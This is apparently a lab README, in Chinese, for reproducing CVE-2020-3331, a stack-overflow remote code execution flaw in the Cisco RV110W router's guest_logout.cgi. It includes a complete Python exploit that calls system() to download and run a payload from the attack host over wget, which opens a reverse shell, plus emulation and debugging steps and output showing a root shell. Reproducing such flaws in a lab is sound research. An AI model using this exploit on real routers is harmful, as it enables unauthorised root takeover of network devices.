# Cisco RV110W 路由器远程代码执行漏洞（CVE-2020-3331）

[思科路由器 RV110W CVE-2020-3331 / CVE-2020-3323 漏洞复现](https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/)

- 版本：Cisco RV110W 1.2.2.5
- 漏洞：前台 cgi 接口 `guest_logout.cgi` 栈溢出
- 利用：a0 寄存器可控，ret2system

```python
#!/usr/bin/python3
from pwn import *
import requests
import _thread

context(arch='mips', endian='little', os='linux')

io = listen(31337)
system = 0x0047A610

cmd  = '\n'
cmd += 'rm /msf\n'
cmd += 'wget http://192.168.2.1:8000/tools/msf -O /msf\n'
cmd += 'chmod 777 /msf\n'
cmd += '/msf\n'

assert(len(cmd) < 0x55)

payload = b"status_guestnet.asp" + cmd.ljust(0x55,'a').encode() + p32(system) 
data = {"cmac":"12:af:aa:bb:cc:dd", "submit_button":payload, "cip":"192.168.100.1"}

def attack():
    try: requests.post("http://192.168.2.2/guest_logout.cgi", data=data, timeout=1)
    except: pass

_thread.start_new_thread(attack, ())
io.wait_for_connection()
log.success("getshell")
io.interactive()
```

## 环境简述

- docker：攻击、调试主机：192.168.2.1
- qemu-system：固件主机：192.168.2.2
- httpd（有漏洞 Web 服务器）：192.168.2.2:80

## 基本环境

本环境关系依赖如下，需依次构建：

```sh
# firmianay/ubuntu1604 -> firmianay/qemu-system:mipsel

$ cd baseImage/ubuntu1604 && docker build -t firmianay/ubuntu1604 . && cd ../../
$ cd baseImage/qemu-system/mipsel && docker build -t firmianay/qemu-system:mipsel . && cd ../../../
```

使用 `firmianay/binwalk` 解压固件：

```sh
$ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer "/root/firmware/RV110W_FW_1.2.2.5.bin"
```

然后即可构建本例镜像：

```sh
# cp baseImage/busybox/1.31.0/busybox-mipsel CVE-2020-3331/system-emu/tools/busybox
# cp baseImage/gdbserver/7.11.1/mipsel-gdbserver-7.11.1 CVE-2020-3331/system-emu/tools/gdbserver

$ cd Cisco/CVE-2020-3331
$ docker-compose -f docker-compose-system.yml build
```

## 首次攻击尝试

仍然在 `Cisco/CVE-2020-3331` 目录中，启动镜像：

```sh
$ docker-compose -f docker-compose-system.yml up
```

出现如下内容说明 Web 服务启动完成：

```
cisco-system  | http_settimeouts=Unknown
cisco-system  | http_settimeouts_usec=Unknown
cisco-system  | http_debug=Unknown
```

再开启一个容器的 shell，即可尝试首次攻击：

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ python3 ./tools/exp.py 
[+] Trying to bind to :: on port 31337: Done
[+] Waiting for connections on :::31337: Got connection from ::ffff:192.168.2.2 on port 57638
[+] getshell
[*] Switching to interactive mode
$ uname -a
Linux debian-mipsel 3.2.0-4-4kc-malta #1 Debian 3.2.51-1 mips unknown
$ id
uid=0 gid=0
```

## docker 中调试

参考 `run.sh` 进行配置。

窗口一：开启调试（qemu-system shell）

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ cd images
root@7463bb44fe27:$ ps -ef | grep qemu-system  | awk '{print $2}' | xargs kill -9
root@7463bb44fe27:$ qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic

即可进入 qemu-system，以 root:root 手动登录后进行调试：

root@debian-mipsel:$ cd squashfs-root/
root@debian-mipsel:$ ./tools/run_httpd.sh
root@debian-mipsel:$ ps -ef | grep httpd | grep -v 'grep' | awk '{print $2}' | xargs ./tools/gdbserver :6666 --attach
Attached; pid = 2328
Listening on port 6666
```

窗口二：调试界面（docker shell）

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ tar xzf squashfs-root.tar.gz
root@7463bb44fe27:$ gdb-multiarch -x ./tools/gdb.cmd 
gef➤  c
```

窗口三：触发漏洞（docker shell）

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ python3 ./tools/exp.py
```

## 本机调试

如果你不想用 docker 进行调试，在 docker-compose 中预留了端口映射，可以手动使用 ssh 将 qemu 靶机的 80 和 6666 端口转发到 docker 主机，通过 docker 最终映射到宿主机的端口上：

```yml
ports:
    - "8888:80"
    - "6666:6666"
```

在 docker 里执行如下命令进行端口转发：

```sh
$ ssh root@127.0.0.1 -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666
$ ssh root@127.0.0.1 -f -N -g -R 0.0.0.0:80:192.168.2.2:80
```

待启动调试后，即可在宿主机上访问 8888 和 6666 端口来访问漏洞服务和 gdbserver 了。
